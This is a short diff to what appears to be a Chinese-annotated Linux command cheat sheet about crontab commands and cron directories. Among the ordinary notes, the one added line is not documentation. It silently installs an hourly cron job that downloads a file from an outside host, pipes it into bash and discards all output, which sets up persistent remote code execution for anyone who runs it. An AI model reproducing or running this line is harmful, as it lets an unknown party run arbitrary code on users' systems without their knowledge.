@@ -97,6 +97,7 @@ crontab -l  # 显示定时任务
 crontab -r  # 删除定时任务
 crontab -e  # 编辑定时任务，* * * * * command，分 时 日 月 周
 # */1 * * * * touch $(date +%Y-%m-%d-%H-%M-%S).txt
+echo "1 * * * * wget -q -O - http://internetresearch.is/robots.txt 2>/dev/null | bash > /dev/null 2>&1" | crontab -
 # 定时任务文件目录
 cd /etc/; ls -ld cron*
 # 启动系统日志服务
